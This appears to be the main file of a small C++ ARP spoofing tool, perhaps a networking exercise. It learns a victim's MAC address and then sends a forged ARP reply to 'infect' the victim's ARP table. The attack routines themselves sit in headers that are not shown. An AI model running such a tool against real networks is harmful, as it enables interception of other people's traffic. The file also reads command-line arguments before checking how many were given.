#include <iostream>
#include <stdlib.h>
#include <string.h>
#include "info_network.hpp"
#include "verification.hpp"
using namespace std;

int main(int argc, char *argv[], char *envp[])
{
    // start verification // check also interface and ip addr
    verification *verif = new verification(argv[1], argv[2], argv[3]);
    if(argc != 4)
        verif->check_argc();
    else{
        verif->check_interface(argv[1]);
        verif->check_ipaddr(argv[2], argv[3]);
    }
    delete verif;
    // end verification

    // Constructor
    arp_packet arp = arp_packet(argv[1], argv[2], argv[3]);

    // get victim's MAC Address
    arp.arp_request();
    arp.arp_capture();
    
    // info.print_status();
    arp.print_status();
    
    // infect victim ARP table
    arp.arp_reply();

    return 0;
}
